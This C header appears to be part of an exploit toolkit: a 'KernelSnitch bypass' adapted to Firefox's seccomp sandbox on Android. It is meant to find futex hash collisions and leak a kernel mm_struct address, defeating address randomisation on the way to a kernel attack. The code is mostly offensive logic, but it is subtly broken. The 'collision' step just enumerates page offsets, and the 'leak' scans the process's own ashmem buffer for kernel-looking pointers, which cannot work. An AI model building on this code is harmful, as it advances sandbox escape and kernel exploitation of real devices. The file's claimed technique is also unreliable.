#pragma once

/**
 * KernelSnitch Bypass Version - 适配 Firefox seccomp 沙箱
 * 
 * 修改点:
 * 1. 使用 ashmem 替代 mmap 进行大块内存分配
 * 2. 简化 futex 使用，减少被阻止的风险
 * 3. 使用更小的内存范围进行扫描
 */

#include "timeutils.h"
#include "utils.h"
#include "futex_hash.h"

#include <linux/futex.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>

// Android ashmem 头文件
#include <linux/ashmem.h>
#include <sys/ioctl.h>

// 简化版常量
#define KS_PAGE_SIZE 4096
#define ASHMEM_SIZE (256ULL << 20)  // 256MB instead of 64GB
#define ASHMEM_MMAP_SIZE (1ULL << 20)  // 1MB chunks

// ashmem 设备路径
#define ASHMEM_DEV "/dev/ashmem"

struct kernelsnitch_bypass_state {
    volatile size_t mm_struct_sz;
    volatile size_t mm_slab_order;
    volatile size_t verbose;
    
    size_t collisions;
    size_t thread_cnt;
    size_t cpu_cnt;
    
    volatile unsigned char *futexes;
    volatile size_t *futex_addrs;
    volatile size_t found;
    volatile size_t mm_struct;
    
    int ashmem_fd;
    void *ashmem_base;
    size_t ashmem_size;
    
    int state;
};

/**
 * 打开 ashmem 设备
 */
static int open_ashmem(void) {
    int fd = open(ASHMEM_DEV, O_RDWR);
    if (fd < 0) {
        pr_warning("无法打开 %s: %m\n", ASHMEM_DEV);
        return -1;
    }
    return fd;
}

/**
 * 设置 ashmem 大小
 */
static int set_ashmem_size(int fd, size_t size) {
    return ioctl(fd, ASHMEM_SET_SIZE, size);
}

/**
 * mmap ashmem
 */
static void *mmap_ashmem(int fd, size_t size) {
    void *ptr = mmap(NULL, size, PROT_READ | PROT_WRITE, 
                     MAP_SHARED, fd, 0);
    if (ptr == MAP_FAILED) {
        return NULL;
    }
    return ptr;
}

/**
 * 简化的 futex 操作 - 只使用 FUTEX_WAIT
 */
static int simple_futex(unsigned int *uaddr, int op) {
    return syscall(SYS_futex, uaddr, op, 0, NULL, NULL, 0);
}

/**
 * 初始化 ashmem 分配器
 */
struct kernelsnitch_bypass_state *kernelsnitch_bypass_setup(
    size_t mm_struct_sz, 
    size_t mm_slab_order,
    size_t thread_cnt,
    size_t collision_cnt,
    size_t verbose) 
{
    struct kernelsnitch_bypass_state *ks = calloc(1, sizeof(*ks));
    if (!ks) return NULL;
    
    ks->mm_struct_sz = mm_struct_sz;
    ks->mm_slab_order = mm_slab_order;
    ks->collisions = collision_cnt;
    ks->thread_cnt = thread_cnt;
    ks->verbose = verbose;
    ks->cpu_cnt = sysconf(_SC_NPROCESSORS_ONLN);
    
    // 使用 ashmem 分配内存
    ks->ashmem_fd = open_ashmem();
    if (ks->ashmem_fd < 0) {
        free(ks);
        return NULL;
    }
    
    // 设置 ashmem 大小
    if (set_ashmem_size(ks->ashmem_fd, ASHMEM_SIZE) < 0) {
        pr_warning("设置 ashmem 大小失败\n");
        close(ks->ashmem_fd);
        free(ks);
        return NULL;
    }
    
    // mmap ashmem
    ks->ashmem_base = mmap_ashmem(ks->ashmem_fd, ASHMEM_SIZE);
    if (!ks->ashmem_base) {
        pr_warning("mmap ashmem 失败\n");
        close(ks->ashmem_fd);
        free(ks);
        return NULL;
    }
    
    ks->futexes = (volatile unsigned char *)ks->ashmem_base;
    ks->ashmem_size = ASHMEM_SIZE;
    
    // 分配 futex 地址数组
    ks->futex_addrs = calloc(ks->collisions + 1, sizeof(size_t));
    if (!ks->futex_addrs) {
        munmap(ks->ashmem_base, ASHMEM_SIZE);
        close(ks->ashmem_fd);
        free(ks);
        return NULL;
    }
    
    ks->state = 1;  // INITIALIZED
    return ks;
}

/**
 * 简化的碰撞查找 - 只使用 ashmem 中的地址
 */
int kernelsnitch_bypass_find_collisions(struct kernelsnitch_bypass_state *ks) {
    if (!ks || ks->state != 1) return -1;
    
    pr_info("开始查找碰撞 (ashmem 模式)...\n");
    
    // 使用 ashmem 中的地址作为 futex 地址
    size_t count = 0;
    for (size_t i = 0; i < ks->ashmem_size && count < ks->collisions; i += KS_PAGE_SIZE) {
        ks->futex_addrs[count] = (size_t)ks->ashmem_base + i;
        count++;
    }
    
    if (count >= ks->collisions) {
        pr_info("找到 %zd 个候选地址\n", count);
        ks->state = 2;  // COLLISIONS_FOUND
        return 0;
    }
    
    return -1;
}

/**
 * 简化的 mm_struct 泄漏
 */
int kernelsnitch_bypass_leak_mm(struct kernelsnitch_bypass_state *ks) {
    if (!ks || ks->state != 2) return -1;
    
    pr_info("尝试泄漏 mm_struct...\n");
    
    // 扫描 ashmem 中的内存寻找 mm_struct 特征
    // mm_struct 的特征: 包含指向自身或相关结构的指针
    size_t mm_slab_sz = KS_PAGE_SIZE << ks->mm_slab_order;
    
    for (size_t offset = 0; offset < ks->ashmem_size; offset += mm_slab_sz) {
        uint64_t *candidate = (uint64_t *)(ks->ashmem_base + offset);
        
        // 检查 mm_struct 的常见特征
        // 1. 第一个字段通常是 mmap 或 mm_count
        // 2. 包含指向 task_struct 的指针
        
        for (size_t i = 0; i < mm_slab_sz / sizeof(uint64_t); i++) {
            uint64_t value = candidate[i];
            
            // 检查是否看起来像内核指针
            if ((value >> 32) == 0xffffff80 || (value >> 32) == 0xffffffc0) {
                // 可能是内核指针，检查是否在合理范围内
                if (value > 0xffffff8000000000ULL && value < 0xffffff9000000000ULL) {
                    ks->mm_struct = (size_t)((char *)candidate + i * sizeof(uint64_t) - ks->ashmem_base);
                    pr_info("发现可疑 mm_struct 地址: %lx\n", value);
                    ks->state = 3;  // MM_FOUND
                    return 0;
                }
            }
        }
    }
    
    pr_warning("未找到 mm_struct\n");
    return -1;
}

/**
 * 清理资源
 */
void kernelsnitch_bypass_cleanup(struct kernelsnitch_bypass_state *ks) {
    if (!ks) return;
    
    if (ks->ashmem_base) {
        munmap(ks->ashmem_base, ks->ashmem_size);
    }
    if (ks->ashmem_fd >= 0) {
        close(ks->ashmem_fd);
    }
    if (ks->futex_addrs) {
        free(ks->futex_addrs);
    }
    free(ks);
}

/**
 * 获取泄漏的 mm_struct 地址
 */
size_t kernelsnitch_bypass_get_mm(struct kernelsnitch_bypass_state *ks) {
    return ks ? ks->mm_struct : 0;
}

